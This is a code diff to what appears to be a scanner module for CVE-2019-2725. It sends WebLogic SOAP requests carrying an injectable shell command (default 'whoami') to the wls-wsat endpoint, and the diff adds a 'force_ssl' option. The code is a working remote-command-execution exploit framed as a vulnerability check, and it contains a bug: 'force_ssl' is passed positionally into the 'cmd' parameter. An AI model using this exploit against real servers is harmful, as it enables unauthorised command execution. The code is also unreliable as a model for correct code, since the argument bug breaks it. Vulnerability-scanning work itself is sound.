@@ -10,7 +10,7 @@ from stars import universe, Star, target_type
 from utils import http
 
 
-def weblogic_10_3_6(target, cmd='whoami'):
+def weblogic_10_3_6(target, cmd='whoami', force_ssl=None):
     headers = {
         "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
         'User-Agent': 'TestUA/1.0',
@@ -29,12 +29,11 @@ def weblogic_10_3_6(target, cmd='whoami'):
      </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body></soapenv:Body></soapenv:Envelope>'''
-    resp, data = http(urljoin(target, '/wls-wsat/CoordinatorPortType'), 'POST', data=body, verify=False,
-                      headers=headers)
+    resp, data = http(urljoin(target, '/wls-wsat/CoordinatorPortType'), 'POST', data=body, headers=headers, ssl=force_ssl)
     return resp
 
 
-def weblogic_12_1_3(target, cmd='whoami'):
+def weblogic_12_1_3(target, cmd='whoami', force_ssl=None):
     headers = {
         "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
         'User-Agent': 'TestUA/1.0',
@@ -95,7 +94,7 @@ def weblogic_12_1_3(target, cmd='whoami'):
     </soapenv:Header>
     <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>''' % cmd
     resp, data = http(urljoin(target, '/wls-wsat/CoordinatorPortType'), 'POST', data=body, verify=False,
-                      headers=headers)
+                      headers=headers, ssl=force_ssl)
     return resp
 
 
@@ -108,9 +107,9 @@ class CVE_2019_2725(Star):
     }
     type = target_type.VULNERABILITY
 
-    def light_up(self, dip, dport, *args, **kwargs) -> (bool, dict):
-        resp = weblogic_10_3_6('http://{}:{}'.format(dip, dport))
+    def light_up(self, dip, dport, force_ssl=None, *args, **kwargs) -> (bool, dict):
+        resp = weblogic_10_3_6('http://{}:{}'.format(dip, dport), force_ssl)
         if resp and resp.status_code == 200:
             return True, {'msg': 'finish.'}
-        resp = weblogic_12_1_3('http://{}:{}'.format(dip, dport))
+        resp = weblogic_12_1_3('http://{}:{}'.format(dip, dport), force_ssl)
         return resp and resp.status_code == 200, {'msg': 'finish.'}
